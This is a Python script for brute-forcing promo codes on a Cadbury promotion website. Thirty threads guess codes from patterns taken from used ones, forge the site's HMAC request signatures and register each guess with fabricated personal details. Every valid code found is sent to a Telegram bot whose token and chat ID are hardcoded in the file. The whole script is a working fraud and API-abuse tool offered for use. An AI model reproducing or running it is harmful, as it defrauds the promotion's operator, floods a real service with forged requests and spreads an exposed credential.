import requests
import json
import base64
import hmac
import hashlib
import random
import string
import time
import urllib.parse
import threading
import os

# ========== TELEGRAM CONFIG ==========
TELEGRAM_BOT_TOKEN = "8646908060:AAGzfWQcu6vDIXKbZTgYuJ-e0ueIHcAOqN8"  # Replace with your bot token
TELEGRAM_CHAT_ID = "1446058092"      # Replace with your chat ID (can be user ID or group ID)

# ========== CONFIG ==========
BASE_URL = "https://cadburybakespromo.com"
MAX_WORKERS = 30
CODE_LENGTH = 10
TIMEOUT = 20

VALID_FILE = "valid_codes.txt"
found_valid = False
valid_code = None
stats_lock = threading.Lock()

# Patterns extracted from the used codes you provided
PATTERNS = [
    "LLLDLLLDLL",   # letter, letter, letter, digit, letter, letter, letter, digit, letter, letter
    "LLLLLLLLDL",   # eight letters, one digit, one letter
    "LLLLLLLLLL"    # ten letters (no digits)
]

# ========== TELEGRAM FUNCTIONS ==========
def send_telegram_message(message, parse_mode="Markdown"):
    """Send message to Telegram"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("⚠️ Telegram not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID")
        return False
    
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True
        }
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            print("✅ Telegram message sent!")
            return True
        else:
            print(f"❌ Telegram send failed: {response.status_code}")
            return False
    except Exception as e:
        print(f"❌ Telegram error: {e}")
        return False

def send_telegram_document(file_path, caption=""):
    """Send a file to Telegram"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        files = {'document': open(file_path, 'rb')}
        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
        response = requests.post(url, files=files, data=data, timeout=30)
        if response.status_code == 200:
            print("✅ Telegram document sent!")
            return True
        else:
            print(f"❌ Document send failed: {response.status_code}")
            return False
    except Exception as e:
        print(f"❌ Document error: {e}")
        return False

# ========== GENERATE CODE ==========
def generate_code():
    pattern = random.choice(PATTERNS)
    code = []
    for ch in pattern:
        if ch == 'L':
            code.append(random.choice(string.ascii_uppercase))
        elif ch == 'D':
            code.append(random.choice(string.digits))
    return ''.join(code)

# ========== SESSION FUNCTIONS ==========
def generate_master_key():
    return str(random.randint(1000000000, 9999999999))

def generate_user_data():
    first_names = ["Raj","Amit","Priya","Vikram","Sneha","Rahul","Anita","Deepak","Neha","Sanjay"]
    last_names = ["Singh","Kumar","Sharma","Patel","Verma","Reddy","Gupta","Joshi","Rao","Malhotra"]
    name = f"{random.choice(first_names)} {random.choice(last_names)}"
    year = random.randint(1960, 2005)
    month = random.randint(1, 12)
    day = random.randint(1, 28)
    age = f"{year:04d}-{month:02d}-{day:02d}"
    pincode = str(random.randint(100000, 999999))
    mobile = str(random.choice([6,7,8,9])) + ''.join(random.choices(string.digits, k=9))
    return {"name": name, "age": age, "pincode": pincode, "mobile": mobile}

def create_session():
    master_key = generate_master_key()
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": BASE_URL,
        "Referer": f"{BASE_URL}/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    }
    cookies = {'casdbury-blockbuster-id': master_key}
    payload = {"masterKey": master_key}
    try:
        resp = requests.post(f"{BASE_URL}/api/users", json=payload, headers=headers, cookies=cookies, timeout=TIMEOUT)
        if resp.status_code == 200:
            data = resp.json()
            if "resp" in data:
                decoded_str = base64.b64decode(data["resp"]).decode()
                decoded = json.loads(decoded_str)
                if decoded.get("statusCode") == 200:
                    return decoded.get("userKey"), decoded.get("dataKey")
    except:
        pass
    return None, None

def generate_signature(payload, user_key, data_key):
    payload_str = json.dumps(payload, separators=(",", ":"))
    part_a = base64.b64encode(payload_str.encode()).decode()
    ts = str(payload["t"])
    part_u = base64.b64encode(ts.encode()).decode()
    hmac_key = data_key[4:18].encode()
    string_to_sign = f"{part_u}.{part_a}"
    hmac_obj = hmac.new(hmac_key, string_to_sign.encode(), hashlib.sha256)
    hmac_result = hmac_obj.hexdigest()
    part_f = base64.b64encode(hmac_result.encode()).decode()
    m = random.randint(1, 6)
    k = random.randint(2, 8)
    h_rand = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(k))
    signature = f"{k}{m}{part_f[0:m]}{h_rand}{part_f[m:]}"
    data_field = f"{urllib.parse.quote_plus(part_u)}.{urllib.parse.quote_plus(part_a)}.{urllib.parse.quote_plus(signature)}"
    return data_field

def register_code(user_key, data_key, code, user_data):
    timestamp = int(time.time() * 1000)
    payload = {
        "code": code,
        "name": user_data["name"],
        "mobile": user_data["mobile"],
        "age": user_data["age"],
        "pincode": user_data["pincode"],
        "agree1": True,
        "promotionalConsent": True,
        "userKey": user_key,
        "t": timestamp
    }
    data_field = generate_signature(payload, user_key, data_key)
    body = f"userKey={user_key}&data={data_field}"
    headers = {
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": BASE_URL,
        "Referer": f"{BASE_URL}/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    }
    url = f"{BASE_URL}/api/users/register/{user_key}"
    try:
        resp = requests.post(url, params={"t": timestamp}, data=body, headers=headers, timeout=TIMEOUT)
        text = resp.text
        try:
            resp_data = resp.json()
            if "resp" in resp_data:
                decoded_str = base64.b64decode(resp_data["resp"]).decode()
                decoded = json.loads(decoded_str)
                decoded["http_status"] = resp.status_code
                return decoded
            return {"statusCode": resp.status_code, "http_status": resp.status_code, "raw": resp_data}
        except:
            return {"statusCode": resp.status_code, "http_status": resp.status_code, "message": text[:100]}
    except Exception as e:
        return {"statusCode": 0, "http_status": 0, "message": str(e)}

# ========== WORKER ==========
def worker(thread_id, user_key, data_key, user_data):
    global found_valid, valid_code
    attempts = 0
    start_time = time.time()
    
    while not found_valid:
        code = generate_code()
        attempts += 1
        response = register_code(user_key, data_key, code, user_data)
        status = response.get("statusCode", 0)
        http_status = response.get("http_status", 0)

        # Print each response
        print(f"\n[Thread-{thread_id:02d}] Code: {code} | HTTP {http_status}")
        if "resp" in response and response["resp"]:
            try:
                decoded_str = base64.b64decode(response["resp"]).decode()
                decoded = json.loads(decoded_str)
                print(f"   Response: {json.dumps(decoded, indent=2)}")
            except:
                print(f"   Response: {response}")
        else:
            print(f"   Response: {json.dumps(response, indent=2)}")

        if status == 200 or http_status == 200:
            found_valid = True
            valid_code = code
            
            # ========== SEND TO TELEGRAM ==========
            elapsed = int(time.time() - start_time)
            message = (
                f"🎉 *VALID CODE FOUND!* 🎉\n\n"
                f"🔑 *Code:* `{code}`\n"
                f"📱 *Mobile:* {user_data['mobile']}\n"
                f"👤 *Name:* {user_data['name']}\n"
                f"📅 *DOB:* {user_data['age']}\n"
                f"📍 *Pincode:* {user_data['pincode']}\n"
                f"🔄 *Attempts:* {attempts}\n"
                f"⏱️ *Time taken:* {elapsed}s\n"
                f"🧵 *Thread:* {thread_id}\n\n"
                f"💾 Saved to: `{VALID_FILE}`"
            )
            
            print(f"\n{'='*60}")
            print(f"🎉🎉 VALID CODE FOUND: {code} 🎉🎉")
            print(f"{'='*60}")
            
            # Send to Telegram
            send_telegram_message(message)
            
            # Also send the file
            with open(VALID_FILE, "a") as f:
                f.write(f"{code} | {user_data['mobile']} | {user_data['name']}\n")
            
            send_telegram_document(VALID_FILE, f"✅ Valid code found: {code}")
            break

        time.sleep(random.uniform(0.02, 0.08))

# ========== TEST TELEGRAM CONNECTION ==========
def test_telegram_connection():
    """Test if Telegram bot is working"""
    print("📤 Testing Telegram connection...")
    success = send_telegram_message(
        "🤖 *Cadbury Brute Force Bot Started!*\n\n"
        "✅ Telegram integration is working.\n"
        "🔍 Waiting for valid code...",
        parse_mode="Markdown"
    )
    if success:
        print("✅ Telegram connected successfully!")
    else:
        print("❌ Telegram connection failed. Check your token and chat ID.")
    return success

# ========== MAIN ==========
def main():
    global found_valid, valid_code
    
    print("="*60)
    print("🔥 CADBURY BRUTE FORCE (PATTERN MODE + TELEGRAM)")
    print("="*60)
    
    # Test Telegram connection
    if TELEGRAM_BOT_TOKEN != "YOUR_BOT_TOKEN_HERE" and TELEGRAM_CHAT_ID != "YOUR_CHAT_ID_HERE":
        test_telegram_connection()
    else:
        print("⚠️ Telegram not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID")
    
    mobile = input("📱 Mobile (10 digits): ").strip()
    if not mobile.isdigit() or len(mobile) != 10:
        print("⌛ Invalid mobile.")
        return

    user_data = generate_user_data()
    user_data["mobile"] = mobile
    print(f"👤 {user_data['name']} | {user_data['age']} | {user_data['pincode']}")

    print("\n⏳ Creating session...")
    user_key, data_key = create_session()
    if not user_key or not data_key:
        print("⌛ Session failed.")
        send_telegram_message("❌ *Session creation failed!*", parse_mode="Markdown")
        return
    
    print(f"✅ UserKey: {user_key}")
    print(f"✅ Key slice: {data_key[4:18]}")
    print(f"\n🚀 Started with {MAX_WORKERS} threads. Looking for valid code...\n")
    
    # Send start notification
    send_telegram_message(
        f"🚀 *Brute Force Started!*\n\n"
        f"📱 Mobile: `{mobile}`\n"
        f"👤 Name: {user_data['name']}\n"
        f"🧵 Threads: {MAX_WORKERS}\n"
        f"🔍 Looking for valid code...",
        parse_mode="Markdown"
    )

    threads = []
    for i in range(MAX_WORKERS):
        t = threading.Thread(target=worker, args=(i+1, user_key, data_key, user_data))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while not found_valid:
            time.sleep(0.5)
            # Send progress update every 1000 attempts (optional)
            if int(time.time()) % 30 == 0:  # Every 30 seconds
                pass
    except KeyboardInterrupt:
        print("\n⏹ Stopping...")
        send_telegram_message("⏹ *Brute Force Stopped by user*", parse_mode="Markdown")

    found_valid = True
    for t in threads:
        t.join(timeout=1)

    if valid_code:
        print(f"\n✅ Valid code saved to {VALID_FILE}: {valid_code}")
        send_telegram_message(
            f"✅ *Done!* Valid code: `{valid_code}`\n\n"
            f"📱 Mobile: `{mobile}`\n"
            f"📁 File: `{VALID_FILE}`",
            parse_mode="Markdown"
        )
    else:
        print("\n⌛ No valid code found.")
        send_telegram_message("❌ *No valid code found*", parse_mode="Markdown")

if __name__ == "__main__":
    try:
        import requests
    except ImportError:
        os.system("pip install requests")
        import requests
    main()
